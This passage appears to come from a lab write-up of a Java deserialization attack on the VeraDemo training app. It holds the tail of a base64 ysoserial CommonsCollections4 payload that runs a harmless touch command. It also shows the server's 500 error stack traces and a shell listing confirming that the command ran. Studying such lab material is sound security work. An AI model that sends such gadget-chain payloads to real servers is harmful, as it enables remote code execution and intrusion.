AQABSgEADUNvbnN0YW50VmFsdWUFrSCT85Hd7z4BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAE1N0dWJUcmFuc2xldFBheWxvYWQBAAxJbm5lckNsYXNzZXMBADVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkOwEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwAnAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApTb3VyY2VGaWxlAQAMR2FkZ2V0cy5qYXZhDAAKAAsHACgBADN5c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzJFN0dWJUcmFuc2xldFBheWxvYWQBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQAUamF2YS9pby9TZXJpYWxpemFibGUBADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzAQAIPGNsaW5pdD4BABFqYXZhL2xhbmcvUnVudGltZQcAKgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsMACwALQoAKwAuAQAedG91Y2ggL3RtcC9Db21tb25zQ29sbGVjdGlvbnM0CAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyMTEzODc1NzgxODQwOTc0AQAgTHlzb3NlcmlhbC9Qd25lcjExMzg3NTc4MTg0MDk3NDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAuAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAAzAA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA3AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAl1cQB+AB8AAAHUyv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAOwAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJcHQABFB3bnJwdwEAeHVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAXZyAB1qYXZheC54bWwudHJhbnNmb3JtLlRlbXBsYXRlcwAAAAAAAAAAAAAAeHB3BAAAAANzcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXEAfgApeA=="
Connection: close


===

===RESPONSE===
HTTP/1.1 500 Internal Server Error
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=47175609044E649395F9124E12E18028; Path=/verademo; HttpOnly
Content-Type: text/html;charset=utf-8
Content-Language: en
Date: Wed, 09 Dec 2020 04:44:43 GMT
Connection: close
Content-Length: 12356

<!doctype html><html lang="en"><head><title>HTTP Status 500 â Internal Server Error</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 500 â Internal Server Error</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Request processing failed; nested exception is org.apache.commons.collections4.FunctorException: InstantiateTransformer: Constructor threw an exception</p><p><b>Description</b> The server encountered an unexpected condition that prevented it from fulfilling the request.</p><p><b>Exception</b> <pre>org.springframework.web.util.NestedServletException: Request processing failed; nested exception is org.apache.commons.collections4.FunctorException: InstantiateTransformer: Constructor threw an exception
	org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:982)
	org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
	org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
</pre></p><p><b>Root Cause</b> <pre>org.apache.commons.collections4.FunctorException: InstantiateTransformer: Constructor threw an exception
	org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:124)
	org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:32)
	org.apache.commons.collections4.functors.ChainedTransformer.transform(ChainedTransformer.java:112)
	org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)
	java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)
	java.util.PriorityQueue.siftDown(PriorityQueue.java:687)
	java.util.PriorityQueue.heapify(PriorityQueue.java:736)
	java.util.PriorityQueue.readObject(PriorityQueue.java:796)
	sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1184)
	java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2296)
	java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2187)
	java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1667)
	java.io.ObjectInputStream.readObject(ObjectInputStream.java:503)
	java.io.ObjectInputStream.readObject(ObjectInputStream.java:461)
	com.veracode.verademo.utils.UserFactory.createFromRequest(UserFactory.java:45)
	com.veracode.verademo.controller.UserController.showLogin(UserController.java:90)
	sun.reflect.GeneratedMethodAccessor31.invoke(Unknown Source)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)
	org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:133)
	org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:97)
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:827)
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:738)
	org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85)
	org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967)
	org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901)
	org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970)
	org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
	org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
</pre></p><p><b>Root Cause</b> <pre>java.lang.reflect.InvocationTargetException
	sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
	sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	java.lang.reflect.Constructor.newInstance(Constructor.java:423)
	org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:116)
	org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:32)
	org.apache.commons.collections4.functors.ChainedTransformer.transform(ChainedTransformer.java:112)
	org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)
	java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)
	java.util.PriorityQueue.siftDown(PriorityQueue.java:687)
	java.util.PriorityQueue.heapify(PriorityQueue.java:736)
	java.util.PriorityQueue.readObject(PriorityQueue.java:796)
	sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1184)
	java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2296)
	java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2187)
	java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1667)
	java.io.ObjectInputStream.readObject(ObjectInputStream.java:503)
	java.io.ObjectInputStream.readObject(ObjectInputStream.java:461)
	com.veracode.verademo.utils.UserFactory.createFromRequest(UserFactory.java:45)
	com.veracode.verademo.controller.UserController.showLogin(UserController.java:90)
	sun.reflect.GeneratedMethodAccessor31.invoke(Unknown Source)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)
	org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:133)
	org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:97)
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:827)
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:738)
	org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85)
	org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967)
	org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901)
	org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970)
	org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
	org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
</pre></p><p><b>Root Cause</b> <pre>java.lang.NullPointerException
	com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:372)
	com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:456)
	com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:486)
	com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.&lt;init&gt;(TrAXFilter.java:58)
	sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
	sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	java.lang.reflect.Constructor.newInstance(Constructor.java:423)
	org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:116)
	org.apache.commons.collections4.functors.InstantiateTransformer.transform(InstantiateTransformer.java:32)
	org.apache.commons.collections4.functors.ChainedTransformer.transform(ChainedTransformer.java:112)
	org.apache.commons.collections4.comparators.TransformingComparator.compare(TransformingComparator.java:81)
	java.util.PriorityQueue.siftDownUsingComparator(PriorityQueue.java:721)
	java.util.PriorityQueue.siftDown(PriorityQueue.java:687)
	java.util.PriorityQueue.heapify(PriorityQueue.java:736)
	java.util.PriorityQueue.readObject(PriorityQueue.java:796)
	sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:1184)
	java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:2296)
	java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:2187)
	java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1667)
	java.io.ObjectInputStream.readObject(ObjectInputStream.java:503)
	java.io.ObjectInputStream.readObject(ObjectInputStream.java:461)
	com.veracode.verademo.utils.UserFactory.createFromRequest(UserFactory.java:45)
	com.veracode.verademo.controller.UserController.showLogin(UserController.java:90)
	sun.reflect.GeneratedMethodAccessor31.invoke(Unknown Source)
	sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	java.lang.reflect.Method.invoke(Method.java:498)
	org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:205)
	org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:133)
	org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:97)
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:827)
	org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:738)
	org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:85)
	org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:967)
	org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:901)
	org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:970)
	org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:861)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
	org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:846)
	javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
	org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
</pre></p><p><b>Note</b> The full stack trace of the root cause is available in the server logs.</p><hr class="line" /><h3>Apache Tomcat/7.0.107</h3></body></html>
===

# On the target, we can see that the execution of "mkdir /tmp/CommonsCollections4" was successful:
root@8174f335c3a6:/tmp# ls
CommonsCollections2  CommonsCollections4  hsperfdata_root
```
